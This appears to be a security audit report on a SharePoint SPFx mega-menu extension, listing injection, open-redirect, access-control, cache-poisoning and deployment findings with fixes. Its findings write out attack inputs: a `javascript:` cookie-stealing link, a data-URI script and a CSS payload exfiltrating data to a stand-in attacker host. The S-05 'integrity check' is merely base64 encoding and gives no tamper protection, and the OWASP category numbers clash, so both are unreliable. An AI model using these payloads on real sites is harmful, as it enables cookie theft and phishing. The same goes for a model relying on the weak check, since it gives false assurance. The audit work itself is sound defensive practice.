# Security Audit Report

**Date:** 2026-03-24
**Standard:** OWASP Top 10:2025
**Scope:** All TypeScript source, PowerShell scripts, SPFx configuration, and deployment manifests

---

## S-01: CSS Injection via Unsanitized Inline Styles

| Field           | Value |
| --------------- | ----- |
| **Severity**    | HIGH |
| **OWASP**       | A03 - Injection |
| **File**        | `src/extensions/megaMenu/components/NotificationBar.tsx` (lines 78-79) |
| **Status**      | Open |

### Description

The `backgroundColor` and `textColor` properties are read directly from the SharePoint Notifications list and injected into inline React styles with zero validation:

```tsx
style={{
  backgroundColor: notification.backgroundColor,
  color: notification.textColor,
}}
```

Any user with list edit permissions can inject arbitrary CSS values. While React's JSX style binding provides some inherent protection (it applies values as individual CSS properties, not raw CSS strings), the risk remains:

- A value like `transparent` combined with spoofed positioning could enable UI redress or phishing overlays.
- In enterprise contexts where list data flows through the REST API as plain strings, the trust boundary is the list permission model - which is insufficiently restrictive (see S-04).

### Proof of Concept

1. Navigate to the Notifications SharePoint list.
2. Edit an existing notification or create a new one.
3. Set `BackgroundColor` to a value designed to obscure or overlay content.
4. The notification bar renders the injected value directly.

### Recommendation

Validate color values against a strict allowlist before rendering:

```typescript
const COLOR_HEX_REGEX = /^#[0-9A-Fa-f]{3,8}$/;
const NAMED_COLORS = new Set(['red', 'blue', 'green', 'yellow', 'white', 'black', 'transparent']);

function isValidColor(value: string): boolean {
  return COLOR_HEX_REGEX.test(value) || NAMED_COLORS.has(value.toLowerCase());
}

// Usage
backgroundColor: isValidColor(notification.backgroundColor)
  ? notification.backgroundColor
  : '#FFF3CD',
```

---

## S-02: URL Injection / Open Redirect via `navigationUrl`

| Field           | Value |
| --------------- | ----- |
| **Severity**    | HIGH |
| **OWASP**       | A03 - Injection |
| **Files**       | `src/extensions/megaMenu/components/MegaMenuNav.tsx` (line 122), `src/extensions/megaMenu/components/MobileNav.tsx` (line 66) |
| **Status**      | Open |

### Description

Navigation URLs are fetched from the SharePoint MegaMenu list and rendered directly into `href` attributes without any validation:

```tsx
<a href={item.navigationUrl} ...>
```

A malicious list editor can insert:

- `javascript:alert(document.cookie)` - XSS via protocol handler
- `data:text/html,<script>...</script>` - Data URI payload execution
- `https://evil-phishing-site.com/sharepoint-login` - Phishing via a legitimate-looking enterprise menu link

This is the **highest-severity finding** because it combines XSS potential with the social engineering trust of an enterprise navigation menu. Users inherently trust the top-level navigation bar.

### Proof of Concept

1. Navigate to the MegaMenu SharePoint list.
2. Create a new item with `NavigationUrl` set to `javascript:alert(document.cookie)`.
3. Set `IsVisible` to `Yes`, provide a `Category` and `Title`.
4. Reload any page where the mega menu is active.
5. Click the injected link.

### Recommendation

Implement a URL validation utility:

```typescript
function isValidNavigationUrl(url: string): boolean {
  // Allow relative URLs
  if (url.startsWith('/') && !url.startsWith('//')) {
    return true;
  }

  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
  } catch {
    return false;
  }
}

// Usage: reject or replace invalid URLs
const safeUrl = isValidNavigationUrl(item.navigationUrl) ? item.navigationUrl : '#';
```

For additional protection in Fortune 100 environments, consider a domain allowlist for external links.

---

## S-03: DOMPurify Allows `style` Attribute in HTML Sanitization

| Field           | Value |
| --------------- | ----- |
| **Severity**    | MEDIUM-HIGH |
| **OWASP**       | A03 - Injection |
| **File**        | `src/extensions/megaMenu/components/NotificationBar.tsx` (line 9) |
| **Status**      | Open |

### Description

The DOMPurify configuration includes `style` in the allowed attributes list:

```typescript
const ALLOWED_ATTR = ['href', 'target', 'rel', 'class', 'style'];
```

While DOMPurify blocks `javascript:` in `href` attributes by default, allowing `style` in user-authored rich text HTML opens the door to:

- **CSS-based data exfiltration**: `style="background: url('https://attacker.com/log?data=...')"` on elements
- **UI redress attacks**: Absolute positioning, z-index manipulation to overlay malicious content
- **Content spoofing**: Using `visibility`, `opacity`, `display` to hide/show content selectively

### Recommendation

Remove `style` from `ALLOWED_ATTR`:

```typescript
const ALLOWED_ATTR = ['href', 'target', 'rel', 'class'];
```

If notification styling is needed, provide predefined CSS classes that list editors can reference via the `class` attribute.

---

## S-04: Insufficient Access Control on Data Source Lists

| Field           | Value |
| --------------- | ----- |
| **Severity**    | MEDIUM |
| **OWASP**       | A01 - Broken Access Control |
| **Files**       | `scripts/Provision-Lists.ps1`, runtime behavior |
| **Status**      | Open |

### Description

The entire navigation and notification system is driven by two SharePoint lists (`MegaMenu`, `Notifications`). The provisioning script creates these as standard `GenericList` templates with no custom permissions. By default in SharePoint Online, site members with the Edit permission level can modify list items.

This means **any user with Edit access to the hosting site can**:

- Insert phishing links into the enterprise-wide navigation
- Create fake critical notifications for social engineering campaigns
- Delete or modify existing navigation items, causing denial of service
- Inject HTML/CSS payloads through the rich text `Message` field

### Impact

Because the mega menu is typically deployed tenant-wide (via `skipFeatureDeployment: true`), a single compromised or malicious site member can affect the navigation experience for **every user across the entire SharePoint tenant**.

### Recommendation

1. **Break permission inheritance** on both lists immediately after provisioning.
2. **Create a dedicated "Navigation Admins" security group** and grant only that group Edit access.
3. **Enable content approval** on both lists so changes require admin review.
4. **Enable list versioning** to maintain an audit trail of all changes.
5. **Configure SharePoint alerts** to notify admins of any list item modifications.

Add to provisioning script:

```powershell
# Break inheritance and restrict access
Set-PnPList -Identity $megaMenuListTitle -BreakRoleInheritance -CopyRoleAssignments:$false
# Then grant specific group access
```

---

## S-05: Session Storage Cache Poisoning

| Field           | Value |
| --------------- | ----- |
| **Severity**    | MEDIUM |
| **OWASP**       | A08 - Software and Data Integrity Failures |
| **File**        | `src/extensions/megaMenu/services/MegaMenuService.ts` (lines 91-109) |
| **Status**      | Open |

### Description

Menu data is cached in `sessionStorage` with a static key (`spfx_megamenu_cache`). The data is read back and parsed with `JSON.parse` without any integrity verification:

```typescript
const entry: CacheEntry = JSON.parse(raw);
```

Any script running on the same SharePoint origin (e.g., another SPFx component with XSS, a compromised third-party script, or a browser extension) can:

1. Write a malicious payload to `sessionStorage` under this key.
2. The mega menu reads and renders the poisoned data without integrity validation.
3. The attack persists for the duration of the browser session (up to 15 minutes via TTL or until the tab is closed).

### Recommendation

Add a simple integrity check to cached data:

```typescript
import { sha256 } from 'some-crypto-lib'; // or use SubtleCrypto

const INTEGRITY_SECRET = 'app-specific-key'; // Not a secret per se, but a domain separator

function computeHash(data: string): string {
  // Use a fast hash to detect tampering
  return btoa(data.substring(0, 50) + data.length + INTEGRITY_SECRET);
}
```

Alternatively, consider moving to an in-memory cache (private class field) instead of `sessionStorage` to eliminate the shared-storage attack vector entirely.

---

## S-06: Tenant-Wide Deployment Without Domain Isolation

| Field           | Value |
| --------------- | ----- |
| **Severity**    | MEDIUM |
| **OWASP**       | A02 - Security Misconfiguration |
| **File**        | `config/package-solution.json` (lines 8-9) |
| **Status**      | Open |

### Description

```json
"skipFeatureDeployment": true,
"isDomainIsolated": false
```

- **`skipFeatureDeployment: true`**: Allows tenant-wide deployment without per-site admin approval. A single tenant admin click deploys to all sites.
- **`isDomainIsolated: false`**: The solution runs in the SharePoint domain context with full access to the SharePoint API, cookies, and session data.

For a Fortune 100 environment, this configuration creates a significant blast radius: a bug in this component could affect **every site and every user in the entire SharePoint tenant**.

### Recommendation

1. Set `skipFeatureDeployment: false` to require explicit site-level activation.
2. Evaluate whether domain isolation is feasible for this use case.
3. Implement a staged rollout process: dev tenant -> staging site collection -> canary sites -> full production.
4. Maintain a rollback plan with a pre-built package of the previous version.

---

## S-07: Missing Dependency Security Controls

| Field           | Value |
| --------------- | ----- |
| **Severity**    | LOW |
| **OWASP**       | A03 - Software Supply Chain Failures |
| **File**        | `package.json`, repository root |
| **Status**      | Open |

### Description

Runtime dependencies use caret (`^`) version ranges:

```json
"@pnp/sp": "^4.8.0",
"dompurify": "^3.2.4"
```

Additionally:

- No `package-lock.json` is committed to the repository.
- No evidence of `npm audit` in any CI/CD pipeline.
- No evidence of dependency review or Software Bill of Materials (SBOM).

### Recommendation

1. Commit `package-lock.json` to version control.
2. Add `npm audit --audit-level=high` to the CI pipeline as a blocking check.
3. Consider pinning exact versions for production builds.
4. Implement automated dependency update tooling (Dependabot, Renovate).
5. Generate and maintain an SBOM for compliance.
